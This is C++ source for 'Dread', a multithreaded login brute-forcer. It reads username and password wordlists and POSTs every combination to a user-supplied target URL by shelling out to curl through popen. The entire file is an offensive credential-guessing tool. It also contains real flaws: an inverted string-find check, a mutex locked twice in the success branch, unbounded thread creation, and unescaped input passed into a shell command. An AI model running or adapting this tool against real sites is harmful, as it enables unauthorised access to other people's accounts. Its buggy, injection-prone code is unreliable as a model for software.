#include "dread.h"
#include <iostream>
#include <vector>
#include <atomic>
#include <fstream>
#include <curl/curl.h>
#include <thread>
#include <mutex>
using Lock = lock_guard<mutex>;
mutex mtx; 
using namespace std;

atomic<bool> found = false;

void Dread::banner(){
    cout << "\033[38;5;94m";
    cout << R"(
############################################
#██████╗ ██████╗ ███████╗ █████╗ ██████╗   #
#██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗  #
#██║  ██║██████╔╝█████╗  ███████║██║  ██║  #
#██║  ██║██╔══██╗██╔══╝  ██╔══██║██║  ██║  #
#██████╔╝██║  ██║███████╗██║  ██║██████╔╝  #
#╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝   #
#                                          #
#              DREAD V1.1                  #
#    By Xpl01t | www.XploitPower.com       #
############################################ 
)"<< "\033[0m" << endl;
}
void Dread::loadWordlists(){
    cout << "[?]Enter the target URL : ";
    cin >> targetURL;

    string user, pass;
    cout << "[+]Enter the path of usernames wordlist: ";
    cin >> user;
    cout << "[+]Enter the path of passwords wordlist: ";
    cin >> pass;

    usernames.clear();
    passwords.clear();
    
    ifstream uFile(user);
    string line;
    ifstream pFile(pass);

    if(!uFile.is_open() && !pFile.is_open()){
        cerr << "[-]Can't open the wordlist." << endl;
        return;
    }

    while (getline(uFile, line)){
        usernames.push_back(line);
    }
    
    while (getline (pFile, line)){
        passwords.push_back(line);
    }

    cout << "\033[1;33m[++]Wordlists has been loaded successfully!\033[0m" << endl;

}
bool Dread::trylogin(const string& user, const string& pass) const {
    string postField = "username=" + user + "&password=" + pass;
    string command = "curl -s -d \"" + postField + "\" -X POST \"" + targetURL + "\"";

    FILE* pipe = popen(command.c_str(), "r");
    if (!pipe) return false;

    char buffer[128];
    string result = "";
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr){
        result += buffer;
    }

    pclose(pipe);

    if(result.find("Invalid username of password")){
        return false;
    }

    return (result.find("200") != string::npos);
}

void Dread::bruteforce(){

    vector<thread> threads;

    for(const string& user : usernames){
        for(const string& pass : passwords){
            if(found.load()) break;

            threads.emplace_back([this, user, pass](){
                if(found.load()) return;

                bool success = trylogin(user, pass);

                Lock lock(mtx);
                cout << "[*]Trying " << user << ":" << pass << endl;



                if(success){
                    found.store(true);
                    Lock lock(mtx);
                    cout << "\033[32m[+]Dread successed: username:" << user << "|password:" << pass << endl;
                }
                else{
                    Lock lock(mtx);
                        
                }
            });
            
            
        }
        if (found.load()) break;
    }

    for(auto& t : threads){
        if(t.joinable()) t.join();
    }
    if(!found.load()){
        cerr << "\033[31m[-]Dread has failed.." << endl;
    }
    
}

void Dread::run(){
    banner();
    loadWordlists();
    bruteforce();

}